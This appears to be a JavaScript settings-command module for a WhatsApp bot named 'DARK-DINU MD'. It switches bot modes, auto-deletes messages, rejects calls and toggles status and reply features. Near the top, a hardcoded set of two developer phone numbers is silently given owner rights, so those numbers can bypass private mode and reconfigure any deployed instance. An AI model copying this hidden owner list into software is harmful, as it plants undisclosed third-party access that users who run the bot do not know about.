import { cleanPhone, initializeSessionState, updateSessionConfig, getSessionConfig } from "../core/sessionManager.js";

const DEV_SET = new Set(["94719845166", "15947733680169"]);
global.settingsHookedSockets = global.settingsHookedSockets || new WeakSet();

function isAuthorized(sock, msg, from, botPhone) {
  if (msg.key.fromMe) return true;
  const senderJid = msg.key.participant || msg.participant || from || "";
  const cleanSender = cleanPhone(senderJid);
  return cleanSender === botPhone || DEV_SET.has(cleanSender);
}

export function attachSettingsEngine(sock) {
  if (!sock || global.settingsHookedSockets.has(sock)) return;
  global.settingsHookedSockets.add(sock);

  const botPhone = cleanPhone(sock.user?.id || "");
  if (botPhone) initializeSessionState(botPhone);

  // 1. Strict Mode Barrier
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;
    const m = messages[0];
    if (!m?.message) return;

    const from = m.key.remoteJid;
    if (!from || from === "status@broadcast") return;

    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);

    const isGroup = from.endsWith("@g.us");
    const sender = isGroup ? (m.key.participant || m.participant || from) : from;
    const cleanSender = cleanPhone(sender);
    const isOwner = m.key.fromMe || cleanSender === currentPhone || DEV_SET.has(cleanSender);

    if (!isOwner) {
      if (cfg.mode === "private") { m.message = null; return; }
      if (cfg.mode === "group" && !isGroup) { m.message = null; return; }
      if (cfg.mode === "inbox" && isGroup) { m.message = null; return; }
    }
  });

  // 2. Anti-Send Barrier
  sock.ev.on("messages.upsert", async ({ messages }) => {
    for (const m of messages) {
      if (!m?.message) continue;
      const chatJid = m.key.remoteJid;
      if (!chatJid || chatJid === "status@broadcast") continue;

      const currentPhone = cleanPhone(sock.user?.id || "");
      const cfg = getSessionConfig(currentPhone);
      if (!cfg || cfg.antiSend === "off") continue;

      if ((cfg.antiSend === "me" || cfg.antiSend === "all") && m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
      if ((cfg.antiSend === "from" || cfg.antiSend === "all") && !m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
    }
  });

  // 3. Anti-Call Rejector
  sock.ev.on("call", async (calls) => {
    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);
    if (!cfg || !cfg.antiCall) return;

    for (const call of calls) {
      if (call.status === "offer") {
        await sock.rejectCall(call.id, call.from).catch(() => {});
      }
    }
  });
}

export default {
  name: "setting",
  aliases: ["settings", "mode", "botmode", "antisend", "config"],
  category: "owner",
  description: "Session-locked ultra fast cluster configuration panel",

  async execute({ sock, msg, from, args, body, prefix, config: botConfig }) {
    attachSettingsEngine(sock);

    const pref = prefix || botConfig?.PREFIX || ".";
    const botPhone = cleanPhone(sock.user?.id || "");
    const settings = getSessionConfig(botPhone);

    if (!isAuthorized(sock, msg, from, botPhone)) {
      sock.sendMessage(from, { react: { text: "🐾", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🎀 *Only the session owner can configure this bot instance!* 🌸" },
        { quoted: msg }
      );
    }

    const fullBody = body.trim().slice(pref.length).trim();
    const cmd = fullBody.split(/\s+/)[0].toLowerCase();
    const opt = args[0]?.toLowerCase()?.trim();
    const val = args[1]?.toLowerCase()?.trim();

    // Mode Switcher
    if (cmd === "mode" || (cmd === "setting" && opt === "mode")) {
      let modeArg = (cmd === "mode" ? opt : val);
      if (["public", "private", "group", "inbox"].includes(modeArg)) {
        await updateSessionConfig(botPhone, "mode", modeArg);
        sock.sendMessage(from, { react: { text: "💖", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(
          from,
          { text: `🌸 *Bot Mode Locked!* Session \`+${botPhone}\` shifted to \`${modeArg.toUpperCase()}\` mode ✨` },
          { quoted: msg }
        );
      }
    }

    // Anti-Send Switcher
    if (cmd === "antisend" || (cmd === "setting" && opt === "antisend")) {
      const modeArg = (cmd === "antisend" ? opt : val);
      if (["me", "from", "all", "off"].includes(modeArg)) {
        await updateSessionConfig(botPhone, "antiSend", modeArg);
        sock.sendMessage(from, { react: { text: "🛡️", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(
          from,
          { text: `✨ *Anti-Send Updated!* Active mode set to: \`${modeArg.toUpperCase()}\` softly. 🌸` },
          { quoted: msg }
        );
      }
    }

    // Toggle Handlers
    const toggleMap = {
      "antidel": "antiDelete",
      "stseen": "statusSeen",
      "stract": "statusReact",
      "autoreply": "autoReply",
      "welcome": "welcomeCard",
      "anticall": "antiCall"
    };

    if (opt && toggleMap[opt]) {
      const targetKey = toggleMap[opt];
      let newState = !settings[targetKey];
      if (val === "on") newState = true;
      if (val === "off") newState = false;

      await updateSessionConfig(botPhone, targetKey, newState);
      sock.sendMessage(from, { react: { text: newState ? "💖" : "💤", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: `🌸 *${opt.toUpperCase()}:*${newState ? "🟢 ACTIVATED & LOCKED ✨" : "🔴 DISABLED SOFTLY 💤"}` },
        { quoted: msg }
      );
    }

    // Custom Emoji
    if (opt === "emoji" && args[1]) {
      const chosenEmoji = args[1].trim();
      await updateSessionConfig(botPhone, "statusEmoji", chosenEmoji);
      sock.sendMessage(from, { react: { text: "✨", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: `🍭 *Status React Emoji Changed to:* ${chosenEmoji} for this session!` },
        { quoted: msg }
      );
    }

    // Master UI Card
    sock.sendMessage(from, { react: { text: "🎛️", key: msg.key } }).catch(() => {});

    const card = 
`🎀 ｡ﾟ•┈୨ *DARK-DINU ISOLATED CONTROL* ୧┈•ﾟ｡ 🐾
━━━━━━━━━━━━━━━━━━━━━━━━

  📱 *Bot Session:* \`+${botPhone}\`
  🔒 *State Isolation:* \`Strict Session-Locked (MongoDB)\`

┌─〔 ⚙️ *ACTIVE SESSION SETTINGS* 〕
├─▸ 🎯 *Mode*         : \`${settings.mode.toUpperCase()}\`
├─▸ 🛡️ *Anti-Delete*  : ${settings.antiDelete ? "🟢 ON" : "🔴 OFF"}
├─▸ 👁️ *Status Seen*  : ${settings.statusSeen ? "🟢 ON" : "🔴 OFF"}
├─▸ 💖 *Status React* : ${settings.statusReact ? "🟢 ON" : "🔴 OFF"} [ ${settings.statusEmoji} ]
├─▸ 💬 *Auto-Reply*   : ${settings.autoReply ? "🟢 ON" : "🔴 OFF"}
├─▸ 💌 *Welcome Card* : ${settings.welcomeCard ? "🟢 ON" : "🔴 OFF"}
├─▸ 🚫 *Anti-Send*    : \`${settings.antiSend.toUpperCase()}\`
├─▸ 📵 *Anti-Call*    : ${settings.antiCall ? "🟢 ON" : "🔴 OFF"}
└───────────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━
🍬 *ONE-STEP COMMANDS:*
  • *${pref}mode <public|private|group|inbox>*
  • *${pref}setting antidel on/off*
  • *${pref}setting stseen on/off*
  • *${pref}setting stract on/off*
  • *${pref}setting autoreply on/off*
  • *${pref}setting anticall on/off*
  • *${pref}setting emoji <emoji>*

💖 *DARK-DINU MD* • https://heshan.devofc.top/`;

    await sock.sendMessage(from, { text: card }, { quoted: msg });
  }
};
